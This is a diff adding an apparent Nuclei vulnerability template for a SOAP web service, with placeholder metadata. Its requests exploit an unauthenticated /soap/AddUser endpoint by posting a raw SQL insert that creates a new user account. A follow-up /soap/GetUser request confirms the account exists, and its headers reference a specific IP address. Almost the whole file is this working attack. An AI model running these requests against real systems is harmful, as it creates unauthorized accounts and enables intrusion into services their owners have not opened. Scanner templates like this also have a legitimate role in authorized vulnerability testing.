@@ -1,0 +1,52 @@
+id: xr-AddUser-useradd
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+variables:
+  user: "{{rand_base(6)}}"
+  passwd: "{{rand_base(6)}}"
+  
+  
+http:
+  - raw:
+      - |-
+        POST /soap/AddUser HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 126
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: language=zh-cn; language=zh-cn;username=admin
+        Connection: close
+
+        insert into userid (USERNAME,PASSWORD,PURVIEW,LOGINDATE,LOGINTIME)
+             values('{{user}}','{{passwd}}','0','2024-5-6','10:25:36')
+      - |
+        POST /soap/GetUser HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: application/xml, text/xml, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: text/xml; charset=utf-8
+        X-Requested-With: XMLHttpRequest
+        Content-Length: 62
+        Origin: http://111.42.96.77:8180
+        Connection: close
+        Referer: http://111.42.96.77:8180/login.html
+        Cookie: language=zh-cn; language=zh-cn
+
+        <GetUser>
+        <User Name="{{user}}" Password="{{passwd}}"/></GetUser>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - </GetUserResult>
